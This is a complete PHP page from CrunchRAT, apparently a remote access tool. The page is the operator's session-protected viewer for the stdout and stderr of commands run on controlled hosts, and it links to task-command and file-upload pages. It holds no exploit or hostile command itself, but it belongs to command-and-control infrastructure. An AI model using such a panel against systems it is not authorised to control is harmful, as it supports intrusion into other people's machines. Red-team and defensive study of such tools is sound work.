<?php
  # Necessary at the top of every page for session management
  session_start();
        
  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";
    
    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  } 
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
    <style>
      body 
      {
        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */
      }
    </style>
    <link href="bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
  </head>

  <body>
    <div class="navbar navbar-inverse navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container">
          <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="brand" href="#">CrunchRAT</a>
          <div class="nav-collapse collapse">
            <ul class="nav">
              <li><a href="hosts.php">Hosts</a></li>
              <li class="active"><li><a href="command.php">Task Command</a></li>
              <li><a href="upload.php">Task File Upload</a></li>
              <li class="active"><a href="output.php">View Output</a></li>
              <li><a href="logout.php">Logout</a></li>
            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container">          
      <table class="table table-bordered">
        <tbody>
        <?php
          $id = $_GET["id"];
          $stdout = $_GET["stdout"];
          $stderr = $_GET["stderr"];

          # If user clicked "stdout" hyperlink from "command.php" page
          # Displays only stdout
          if (isset($id) && isset($stdout))
          {
            # Gets "stdout" for the command and puts it in a HTML table on "viewOut.php"
            $statement = $dbConnection->prepare("SELECT stdout FROM output WHERE id = :id");
            $statement->bindValue(":id", $_GET["id"]);
            $statement->execute();
            $results = $statement->fetchAll();

            foreach ($results as $row)
            {
              echo "<pre>" . htmlentities($row["stdout"], ENT_QUOTES, "UTF-8") . "</pre>";
            }
          }
            
          # If user clicked "stderr" hyperlink from "command.php" page
          # Displays only stderr
          if (isset($id) && isset($stderr))
          {
            # Gets "stderr" for the command and puts it in a HTML table on "viewOut.php"
            $statement = $dbConnection->prepare("SELECT stderr FROM output WHERE id = :id");
            $statement->bindValue(":id", $_GET["id"]);
            $statement->execute();
            $results = $statement->fetchAll();

            foreach ($results as $row)
            {
              echo "<pre>" . htmlentities($row["stderr"], ENT_QUOTES, "UTF-8") . "</pre>";
            }
          }
        ?>
        </tbody>
      </table>
    </div><!-- /container -->

    <!-- Javascript - placed at the bottom so it loads faster -->
    <script src="bootstrap/js/jquery.js"></script>
    <script src="bootstrap/js/bootstrap-transition.js"></script>
    <script src="bootstrap/js/bootstrap-alert.js"></script>
    <script src="bootstrap/js/bootstrap-modal.js"></script>
    <script src="bootstrap/js/bootstrap-dropdown.js"></script>
    <script src="bootstrap/js/bootstrap-scrollspy.js"></script>
    <script src="bootstrap/js/bootstrap-tab.js"></script>
    <script src="bootstrap/js/bootstrap-tooltip.js"></script>
    <script src="bootstrap/js/bootstrap-popover.js"></script>
    <script src="bootstrap/js/bootstrap-button.js"></script>
    <script src="bootstrap/js/bootstrap-collapse.js"></script>
    <script src="bootstrap/js/bootstrap-carousel.js"></script>
    <script src="bootstrap/js/bootstrap-typeahead.js"></script>
  </body>
</html>